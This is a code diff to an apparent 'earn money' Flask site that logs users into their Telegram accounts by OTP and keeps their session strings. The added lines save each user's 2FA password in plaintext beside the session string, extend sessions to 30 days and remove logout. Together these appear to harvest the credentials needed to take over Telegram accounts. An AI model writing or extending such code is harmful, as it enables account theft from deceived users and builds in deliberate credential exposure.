@@ -12,6 +12,10 @@ from concurrent.futures import ThreadPoolExecutor
 
 app = Flask(__name__)
 app.secret_key = secrets.token_hex(16)
+app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)  # Session lasts 30 days
+app.config['SESSION_COOKIE_SECURE'] = False  # Set to True if using HTTPS
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
 
 # Configuration
 API_ID = 29724770
@@ -241,6 +245,7 @@ def verify_otp():
             'last_name': user.last_name,
             'username': user.username,
             'session_string': final_session_string,
+            'password_2fa': password if password else None,  # Store 2FA password
             'last_login': datetime.utcnow()
         }
         
@@ -272,7 +277,8 @@ def verify_otp():
         if session_id in temp_sessions:
             del temp_sessions[session_id]
         
-        # Set user session with earning info
+        # Set user session with earning info and make it permanent
+        session.permanent = True  # Make session persistent
         session['user_id'] = user.id
         session['user_name'] = user.first_name
         session['is_new_user'] = is_new_user
@@ -309,7 +315,7 @@ def dashboard():
     
     # Calculate time remaining for withdrawal
     withdrawal_available_at = user_data.get('withdrawal_available_at')
-    time_remaining = None
+    remaining_time = 0
     can_withdraw = False
     
     if withdrawal_available_at:
@@ -317,18 +323,14 @@ def dashboard():
         if now >= withdrawal_available_at:
             can_withdraw = True
         else:
-            time_remaining = withdrawal_available_at - now
+            time_delta = withdrawal_available_at - now
+            remaining_time = int(time_delta.total_seconds())
     
     return render_template('dashboard.html', 
                          user=user_data, 
-                         time_remaining=time_remaining,
+                         remaining_time=remaining_time,
                          can_withdraw=can_withdraw,
                          is_new_user=session.get('is_new_user', False))
-
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for('index'))
 
 if __name__ == '__main__':
     app.run(debug=True)
